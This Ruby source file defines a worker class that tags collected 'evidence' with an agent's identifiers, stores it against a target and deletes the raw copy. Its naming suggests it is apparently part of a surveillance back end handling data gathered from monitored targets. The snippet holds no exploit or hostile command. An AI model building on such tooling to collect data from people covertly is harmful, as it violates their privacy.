require 'rcs-common/trace'

module RCS
module Worker

class SingleProcessor
  include RCS::Tracer
  require 'pp'

  def initialize(agent, target)
    @agent = agent
    @target = target
    @calls = []
  end

  def feed(evidence)
    # store agent instance in evidence (used when storing into db)
    evidence[:instance] = @agent['instance']
    evidence[:ident] = @agent['ident']

    ev = evidence.store @agent, @target
    delete_raw evidence
    ev
  end
  
  def delete_raw(evidence)
    RCS::DB::GridFS.delete(evidence[:db_id], "evidence")
    trace :debug, "deleted raw evidence #{evidence[:db_id]}"
  end
end

end # Worker
end # RCS